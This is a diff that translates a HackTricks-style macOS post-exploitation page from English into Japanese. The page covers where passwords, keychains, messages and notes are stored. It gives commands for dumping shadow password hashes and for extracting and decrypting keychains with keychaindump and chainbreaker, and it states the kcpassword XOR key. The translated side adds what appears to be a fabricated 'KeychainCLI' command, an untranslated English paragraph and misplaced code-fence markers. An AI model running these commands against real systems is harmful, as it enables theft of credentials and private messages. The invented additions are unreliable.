@@ -1,23 +1,23 @@
-# macOS Sensitive Locations
+# macOSの機密情報の場所
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
+* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
+* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
+* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**
 
 </details>
 
-## Passwords
+## パスワード
 
-### Shadow Passwords
+### シャドウパスワード
 
-Shadow password is stored with the user's configuration in plists located in **`/var/db/dslocal/nodes/Default/users/`**.\
-The following oneliner can be use to dump **all the information about the users** (including hash info):
+シャドウパスワードは、ユーザーの設定と共に**`/var/db/dslocal/nodes/Default/users/`**にあるplistに格納されています。\
+次のワンライナーを使用して、**ユーザーに関するすべての情報**（ハッシュ情報を含む）をダンプすることができます：
 
 {% code overflow="wrap" %}
 ```bash
@@ -25,9 +25,9 @@ for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"
 ```
 {% endcode %}
 
-[**Scripts like this one**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) or [**this one**](https://github.com/octomagon/davegrohl.git) can be used to transform the hash to **hashcat** **format**.
+[**このようなスクリプト**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2)や[**このようなスクリプト**](https://github.com/octomagon/davegrohl.git)を使用して、ハッシュを**hashcatの形式**に変換することができます。
 
-An alternative one-liner which will dump creds of all non-service accounts in hashcat format `-m 7100` (macOS PBKDF2-SHA512):
+macOS PBKDF2-SHA512の**-m 7100**形式で、すべての非サービスアカウントの資格情報をダンプする代替のワンライナーは次のとおりです：
 
 {% code overflow="wrap" %}
 ```bash
@@ -35,10 +35,9 @@ sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex
 ```
 {% endcode %}
 
-### Keychain Dump
+### キーチェーンのダンプ
 
-Note that when using the security binary to **dump the passwords decrypted**, several prompts will ask the user to allow this operation.
-
+securityバイナリを使用してパスワードを復号化してダンプする場合、ユーザーにこの操作を許可するように求めるプロンプトがいくつか表示されることに注意してください。
 ```bash
 #security
 secuirty dump-trust-settings [-s] [-d] #List certificates
@@ -47,53 +46,53 @@ security list-smartcards #List smartcards
 security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
 security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
 ```
-
 ### [Keychaindump](https://github.com/juuso/keychaindump)
 
 {% hint style="danger" %}
-Based on this comment [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) it looks like these tools aren't working anymore in Big Sur.
+[このコメント](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760)に基づくと、これらのツールはBig Surではもう動作しないようです。
 {% endhint %}
 
-The attacker still needs to gain access to the system as well as escalate to **root** privileges in order to run **keychaindump**. This approach comes with its own conditions. As mentioned earlier, **upon login your keychain is unlocked by default** and remains unlocked while you use your system. This is for convenience so that the user doesn’t need to enter their password every time an application wishes to access the keychain. If the user has changed this setting and chosen to lock the keychain after every use, keychaindump will no longer work; it relies on an unlocked keychain to function.
+攻撃者は、**keychaindump**を実行するためにシステムへのアクセス権限を取得し、**root**権限にエスカレーションする必要があります。このアプローチには独自の条件があります。前述のように、**ログイン時にはデフォルトでキーチェーンがアンロックされ、システムを使用している間はアンロックされたまま**です。これは利便性のためであり、アプリケーションがキーチェーンにアクセスするたびにパスワードを入力する必要がないためです。ユーザーがこの設定を変更し、使用ごとにキーチェーンをロックするように選択した場合、keychaindumpはもはや機能しません。keychaindumpはアンロックされたキーチェーンに依存しています。
 
-It’s important to understand how Keychaindump extracts passwords out of memory. The most important process in this transaction is the ”**securityd**“ **process**. Apple refers to this process as a **security context daemon for authorization and cryptographic operations**. The Apple developer libraries don’t say a whole lot about it; however, they do tell us that securityd handles access to the keychain. In his research, Juuso refers to the **key needed to decrypt the keychain as ”The Master Key“**. A number of steps need to be taken to acquire this key as it is derived from the user’s OS X login password. If you want to read the keychain file you must have this master key. The following steps can be done to acquire it. **Perform a scan of securityd’s heap (keychaindump does this with the vmmap command)**. Possible master keys are stored in an area flagged as MALLOC\_TINY. You can see the locations of these heaps yourself with the following command:
-
+Keychaindumpがメモリからパスワードを抽出する方法を理解することは重要です。このトランザクションで最も重要なプロセスは「**securityd**」プロセスです。Appleはこのプロセスを**認証および暗号操作のセキュリティコンテキストデーモン**と呼んでいます。Appleの開発者ライブラリはそれについてあまり詳しく説明していませんが、securitydがキーチェーンへのアクセスを処理していることを教えてくれます。Juusoの研究では、キーチェーンを復号化するために必要な鍵を「**マスターキー**」と呼んでいます。このマスターキーはユーザーのOS Xログインパスワードから派生しているため、このキーチェーンファイルを読み取るためにはこのマスターキーが必要です。次の手順でマスターキーを取得できます。**securitydのヒープをスキャンします（keychaindumpはvmmapコマンドを使用してこれを行います）**。可能なマスターキーはMALLOC\_TINYとしてフラグが立てられた領域に格納されています。次のコマンドでこれらのヒープの場所を自分で確認できます。
 ```bash
 sudo vmmap <securityd PID> | grep MALLOC_TINY
 ```
-
-**Keychaindump** will then search the returned heaps for occurrences of 0x0000000000000018. If the following 8-byte value points to the current heap, we’ve found a potential master key. From here a bit of deobfuscation still needs to occur which can be seen in the source code, but as an analyst the most important part to note is that the necessary data to decrypt this information is stored in securityd’s process memory. Here’s an example of keychain dump output.
-
+**Keychaindump**は、返されたヒープを0x0000000000000018の出現箇所を検索します。次の8バイトの値が現在のヒープを指している場合、潜在的なマスターキーが見つかります。ここから、ソースコードで確認できるように、少しの復号化が必要ですが、分析者として最も重要な点は、この情報を復号化するために必要なデータがsecuritydのプロセスメモリに格納されていることです。以下は、keychain dumpの出力の例です。
 ```bash
 sudo ./keychaindump
 ```
-
 ### chainbreaker
 
-[**Chainbreaker**](https://github.com/n0fate/chainbreaker) can be used to extract the following types of information from an OSX keychain in a forensically sound manner:
+[**Chainbreaker**](https://github.com/n0fate/chainbreaker)は、OSXキーチェーンから次の種類の情報を法的に安全な方法で抽出するために使用できます：
 
-* Hashed Keychain password, suitable for cracking with [hashcat](https://hashcat.net/hashcat/) or [John the Ripper](https://www.openwall.com/john/)
-* Internet Passwords
-* Generic Passwords
-* Private Keys
-* Public Keys
-* X509 Certificates
-* Secure Notes
-* Appleshare Passwords
+* ハッシュ化されたキーチェーンのパスワード（[hashcat](https://hashcat.net/hashcat/)や[John the Ripper](https://www.openwall.com/john/)でクラック可能）
+* インターネットパスワード
+* 一般的なパスワード
+* プライベートキー
+* 公開鍵
+* X509証明書
+* セキュアノート
+* Appleshareパスワード
 
-Given the keychain unlock password, a master key obtained using [volafox](https://github.com/n0fate/volafox) or [volatility](https://github.com/volatilityfoundation/volatility), or an unlock file such as SystemKey, Chainbreaker will also provide plaintext passwords.
+キーチェーンのアンロックパスワード、[volafox](https://github.com/n0fate/volafox)や[volatility](https://github.com/volatilityfoundation/volatility)で取得したマスターキー、またはSystemKeyなどのアンロックファイルがあれば、Chainbreakerは平文のパスワードも提供します。
 
-Without one of these methods of unlocking the Keychain, Chainbreaker will display all other available information.
+キーチェーンをアンロックするためのこれらの方法がない場合、Chainbreakerは他の利用可能な情報を表示します。
 
-### **Dump keychain keys**
-
+### **キーチェーンのキーをダンプする**
 ```bash
 #Dump all keys of the keychain (without the passwords)
 python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
 ```
+### **SystemKeyを使用してキーチェーンのキー（パスワード付き）をダンプする**
 
-### **Dump keychain keys (with passwords) with SystemKey**
+SystemKeyを使用すると、MacOSのキーチェーンに保存されているキー（パスワードを含む）をダンプすることができます。
 
+```bash
+/System/Library/Security/SecurityAgentPlugins/SystemKeychain.bundle/Contents/Resources/KeychainCLI -k /Library/Keychains/System.keychain -d
+```
+
+このコマンドを実行すると、`/Library/Keychains/System.keychain`に保存されているキーチェーンのキーがダンプされます。
 ```bash
 # First, get the keychain decryption key
 # To get this decryption key you need to be root and SIP must be disabled
@@ -101,9 +100,17 @@ hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
 ## Use the previous key to decrypt the passwords
 python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
 ```
+### **ハッシュをクラックしてキーチェーンのキー（パスワード付き）をダンプする**
 
-### **Dump keychain keys (with passwords) cracking the hash**
+To dump keychain keys with passwords, you can crack the hash. Here's how you can do it:
 
+1. Obtain the hash of the keychain password. This can be done by extracting the keychain file from the target macOS system.
+
+2. Use a password cracking tool, such as John the Ripper or Hashcat, to crack the hash. These tools utilize various techniques, such as dictionary attacks or brute-force attacks, to guess the password.
+
+3. Once the password is cracked, you can use it to decrypt the keychain file and extract the keys along with their associated passwords.
+
+Keep in mind that cracking a hash can be a time-consuming process, especially if the password is complex. Additionally, it is important to note that unauthorized access to someone else's keychain is illegal and unethical. This technique should only be used for legitimate purposes, such as during a penetration test or with proper authorization.
 ```bash
 # Get the keychain hash
 python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
@@ -112,11 +119,9 @@ hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
 # Use the key to decrypt the passwords
 python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
 ```
+### **メモリダンプを使用してキーチェーンのキー（パスワード付き）をダンプする**
 
-### **Dump keychain keys (with passwords) with memory dump**
-
-[Follow these steps](..#dumping-memory-with-osxpmem) to perform a **memory dump**
-
+キーチェーンのキー（パスワード付き）をダンプするために、[以下の手順](..#dumping-memory-with-osxpmem)に従ってください。
 ```bash
 #Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
 # Unformtunately volafox isn't working with the latest versions of MacOS
@@ -125,27 +130,23 @@ python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump
 #Try to extract the passwords using the extracted keychain passwords
 python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
 ```
+### **ユーザーのパスワードを使用してキーチェーンのキー（パスワード付き）をダンプする**
 
-### **Dump keychain keys (with passwords) using users password**
-
-If you know the users password you can use it to **dump and decrypt keychains that belong to the user**.
-
+ユーザーのパスワードを知っている場合、それを使用してユーザーに属するキーチェーンをダンプして復号化することができます。
 ```bash
 #Prompt to ask for the password
 python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
 ```
-
 ### kcpassword
 
-The **kcpassword** file is a file that holds the **user’s login password**, but only if the system owner has **enabled automatic login**. Therefore, the user will be automatically logged in without being asked for a password (which isn't very secure).
+**kcpassword**ファイルは、システムの所有者が**自動ログインを有効に**している場合にのみ、**ユーザーのログインパスワード**を保持するファイルです。したがって、ユーザーはパスワードを求められることなく自動的にログインされます（これはあまり安全ではありません）。
 
-The password is stored in the file **`/etc/kcpassword`** xored with the key **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. If the users password is longer than the key, the key will be reused.\
-This makes the password pretty easy to recover, for example using scripts like [**this one**](https://gist.github.com/opshope/32f65875d45215c3677d).
+パスワードは、ファイル**`/etc/kcpassword`**に**`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**というキーでXORされて格納されます。ユーザーのパスワードがキーよりも長い場合、キーは再利用されます。\
+これにより、パスワードは非常に簡単に回復できます。たとえば、[**このようなスクリプト**](https://gist.github.com/opshope/32f65875d45215c3677d)を使用することができます。
 
-## Interesting Information in Databases
+## データベース内の興味深い情報
 
-### Messages
-
+### メッセージ
 ```bash
 sqlite3 $HOME/Library/Messages/chat.db .tables
 sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
@@ -153,25 +154,22 @@ sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
 sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
 sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
 ```
+### 通知
 
-### Notifications
+通知データは`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`にあります。
 
-You can find the Notifications data in `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`
-
-Most of the interesting information is going to be in **blob**. So you will need to **extract** that content and **transform** it to **human** **readable** or use **`strings`**. To access it you can do:
+興味深い情報のほとんどは**blob**に含まれています。そのため、そのコンテンツを**抽出**して**人間が読める形式**に変換するか、**`strings`**を使用する必要があります。アクセスするには、次のようにします：
 
 {% code overflow="wrap" %}
 ```bash
 cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
 strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
 ```
+### ノート
+
+ユーザーの**ノート**は`~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`に保存されています。
+
 {% endcode %}
-
-### Notes
-
-The users **notes** can be found in `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`
-
-{% code overflow="wrap" %}
 ```bash
 sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables
 
@@ -184,10 +182,10 @@ for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.s
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝したいですか？** または、**PEASSの最新バージョンにアクセスしたいですか？** または、**HackTricksをPDFでダウンロードしたいですか？** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
+* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
+* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローしてください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
+* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**
 
 </details>
